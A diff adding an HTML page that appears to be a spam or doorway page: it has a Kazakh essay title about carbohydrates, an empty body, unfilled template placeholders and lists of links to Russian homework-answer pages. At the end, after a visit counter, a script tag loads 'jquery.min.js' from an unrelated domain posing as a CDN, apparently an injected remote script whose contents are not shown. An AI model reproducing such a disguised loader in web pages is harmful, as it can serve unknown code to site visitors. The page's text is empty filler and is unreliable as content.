@@ -1,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Көмірсу туралы реферат - quoodai.rockybars.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">quoodai.rockybars.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Көмірсу туралы реферат</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="ioxd-sochinenie-kak-mitrasha-i-nastya-sobiralis-za-klyukvoy.html">Сочинение как митраша и настя собирались за клюквой</a></li>
+                                <li><a href="ioxd-referat-na-temu-peshehod-i-bezopasnost-peshehoda-5-klass-obzh.html">Реферат на тему пешеход и безопасность пешехода 5 класс обж</a></li>
+                                <li><a href="ioxd-shpargalki-osnovy-filosofii.html">Шпаргалки основы философии</a></li>
+                                <li><a href="ioxd-reshebnik-matematika-rabochaya-tetrad-2-klass.html">Решебник математика рабочая тетрадь 2 класс</a></li>
+                                <li><a href="ioxd-zadachnik-6-klass-bunimovich-reshebnik.html">Задачник 6 класс бунимович решебник</a></li>
+                                <li><a href="ioxd-besplatnye-referaty-na-temu-ekologiya-rabota-s-opasnymi-othodami-v-gazovoy-otrasli.html">Бесплатные рефераты на тему экология работа с опасными отходами в газовой отрасли</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ioxd-gdz-po-geometrii-10-11-klass-2012-god-atanasyan.html">Гдз по геометрии 10-11 класс 2012 год атанасян</a></li>
+                                            <li><a href="ioxd-algoritm-napisanie-sochinenie-po-gia.html">Алгоритм написание сочинение по гиа</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ioxd-gdz-rabochaya-tetrad-po-okruzh-miru-4-klass-pleshakov.html">Гдз рабочая тетрадь по окруж миру 4 класс плешаков</a></li>
+                                            <li><a href="ioxd-sudarkina-haritina-vladimirovna-avtoreferat.html">Сударкина харитина владимировна автореферат</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ioxd-literaturnoe-chtenie-2-klass-shkola-2100-uchebnik-2-chast-chitat.html">Литературное чтение 2 класс школа 2100 учебник 2 часть читать</a></li>
+                                            <li><a href="ioxd-reshebnik-po-rabochiy-tetradi-po-geometrii-5-klass-dronov.html">Решебник по рабочий тетради по геометрии 5 класс дронов</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ioxd-reshebnik-s-matematiki-5-klassa.html">Решебник с математики 5 класса</a></li>
+                                            <li><a href="ioxd-gdz-po-osnovam-zdorovya-4-klass-zoshit-boychenko.html">Гдз по основам здоровья 4 класс зошит бойченко</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
